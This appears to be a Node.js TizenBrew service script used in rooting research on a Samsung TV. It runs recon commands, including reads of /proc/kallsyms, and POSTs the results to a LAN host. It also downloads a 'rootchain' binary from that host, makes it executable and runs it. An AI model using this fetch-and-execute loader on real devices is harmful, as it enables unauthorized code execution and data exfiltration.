/**
 * service.js v2 — módulo TizenBrew EnvProbe fase 2
 *
 * Corre como servicio de TizenBrew (uid owner).
 * Plan:
 *  1. info del entorno Node (versiones, bindings)
 *  2. descargar rootchain (binario armv7) del fileserver de la Mac
 *  3. escribirlo en /tmp y chmod +x
 *  4. intentar exec ( si UEP lo bloquea, lo reportamos)
 *  5. si exec OK: ejecutar versión solo-lectura primero (scan sin escribir)
 */
var cp = require('child_process');
var fs = require('fs');
var http = require('http');

var DEST_HOST = '192.168.1.35';
var DEST_PORT = 9999;
var SRC_HOST = '192.168.1.35';
var SRC_PORT = 8000;

function report(obj) {
    var body = JSON.stringify(obj);
    var req = http.request({
        host: DEST_HOST, port: DEST_PORT, path: '/probe2', method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, function (res) { res.resume(); });
    req.on('error', function (e) { console.log('probe2 POST err ' + e.message); });
    req.write(body);
    req.end();
}

function runCollect(cmds, done) {
    var out = [];
    function next(i) {
        if (i >= cmds.length) { done(out); return; }
        cp.exec(cmds[i], { timeout: 8000 }, function (err, so, se) {
            out.push({ cmd: cmds[i], out: String(so), errout: String(se), err: err ? String(err.message || err) : null });
            next(i + 1);
        });
    }
    next(0);
}

function httpGetBinary(path, cb) {
    http.get({ host: SRC_HOST, port: SRC_PORT, path: path }, function (res) {
        if (res.statusCode !== 200) { cb(new Error('HTTP ' + res.statusCode)); return; }
        var chunks = [];
        res.on('data', function (c) { chunks.push(c); });
        res.on('end', function () { cb(null, Buffer.concat(chunks)); });
    }).on('error', cb);
}

(function main() {
    var info = {
        node: (typeof process !== 'undefined') ? process.version : '?',
        platform: (typeof process !== 'undefined') ? process.platform : '?',
        execArgv: (typeof process !== 'undefined') ? String(process.execArgv) : '?',
        ids: (typeof process !== 'undefined') ? (String(process.uid) + ':' + String(process.gid)) : '?',
        tls: (typeof process !== 'undefined') ? String(!!process.binding) : '?'
    };

    var cmds = [
        'id',
        'ls -l /proc/self/fd 2>&1 | head',
        'ls -la /run/user/5001 2>&1 | head -5',
        'cat /proc/self/status 2>&1 | head -20',
        'ls -l /bin /usr/bin 2>&1 | head -60',
        'ls /usr/sbin /opt/bin 2>&1 | head -40',
        'ls -l /dev/ntksys /dev/ntkhdma /dev/sdp_mem',
        'cat /proc/kallsyms 2>&1 | grep -c "ker_sys"',
        'env | head -12'
    ];

    runCollect(cmds, function (out) {
        info.cmds = out;

        // 2. descargar binario
        httpGetBinary('/fw-analysis/bin/rootchain_ro', function (err, buf) {
            if (err) { info.dl = 'ERR ' + err.message; report(info); return; }
            info.dl = 'ok ' + buf.length + 'B';
            // 3. escribir a /tmp (tmpfs) y chmod
            var path = '/tmp/rootchain_ro';
            var pathExec = '/run/user/5001/rootchain_ro';
            try {
                fs.writeFileSync(pathExec, buf);
                fs.chmodSync(pathExec, 0o755);
                info.write = 'ok ' + pathExec + ' ' + buf.length;
                try { fs.writeFileSync(path, buf); fs.chmodSync(path, 0o755); info.write += ' + /tmp'; } catch (e) {}
            } catch (e) {
                info.write = 'ERR ' + e.message;
                report(info); return;
            }

            // 4. exec
            cp.exec(pathExec, { timeout: 120000 }, function (err, so, se) {
                info.exec = {
                    err: err ? String(err.message || err) : null,
                    code: err ? err.code : null,
                    out: String(so).slice(0, 4000),
                    errout: String(se).slice(0, 2000)
                };
                // 5. también intentamos /tmp por si /run falla en exec
                cp.exec('/tmp/rootchain_ro', { timeout: 120000 }, function (err2, so2, se2) {
                    info.exec2 = {
                        err: err2 ? String(err2.message || err2) : null,
                        code: err2 ? err2.code : null,
                        out: String(so2).slice(0, 4000),
                        errout: String(se2).slice(0, 2000)
                    };
                    report(info);
                });
            });
        });
    });
})();